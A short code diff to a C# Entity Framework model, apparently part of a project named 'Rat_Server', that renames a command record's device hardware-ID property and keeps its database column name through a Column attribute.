@@ -1,5 +1,6 @@
 ﻿using Microsoft.EntityFrameworkCore;
 using System.ComponentModel.DataAnnotations;
+using System.ComponentModel.DataAnnotations.Schema;
 
 
 namespace Rat_Server.Model
@@ -11,7 +12,8 @@ namespace Rat_Server.Model
         public Guid commandId { get; set; }
 
         [Required]
-        public Guid DeviceHwid { get; set; }
+        [Column("DeviceHwid")]
+        public Guid Hwid { get; set; }
 
         [Required]
         [MaxLength(600)]
